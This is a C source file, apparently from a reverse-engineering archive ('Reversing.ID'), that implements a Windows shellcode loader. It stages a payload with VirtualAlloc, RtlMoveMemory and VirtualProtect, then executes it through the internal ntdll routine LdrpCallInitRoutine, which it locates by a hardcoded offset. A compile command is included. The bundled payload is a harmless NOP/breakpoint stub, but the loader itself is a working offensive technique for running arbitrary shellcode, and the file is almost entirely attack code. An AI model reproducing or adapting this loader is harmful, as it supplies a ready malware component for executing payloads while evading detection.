/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  LdrpCallInitRoutine
*/

#include <windows.h>
#include <stdint.h>

/* ========= some definition ========= */
#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status)   ((NTSTATUS)(Status) == STATUS_SUCCESS)

#define OFFSET_LDRPCALLINITROUTINE  0x000199bc

/* ========= function signatures ========= */
typedef size_t(__fastcall* LpCallInitRoutine)(size_t, size_t, size_t);
typedef char LdrpCallInitRoutine_t (LpCallInitRoutine,size_t, unsigned int, size_t);
typedef LdrpCallInitRoutine_t FAR * pLdrpCallInitRoutine;


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    NTSTATUS    status;
    HMODULE     ntdll;

    // function pointer to internal API
    pLdrpCallInitRoutine LdrpCallInitRoutine;

    // resolve all functions
    ntdll = GetModuleHandle("ntdll.dll");
    
    // resolve manually using offset from ntdll
    // need more research: search by array of byte
    LdrpCallInitRoutine = (pLdrpCallInitRoutine)((uintptr_t)ntdll + OFFSET_LDRPCALLINITROUTINE);

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        LdrpCallInitRoutine ((LpCallInitRoutine)runtime, 0, 0, 0);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}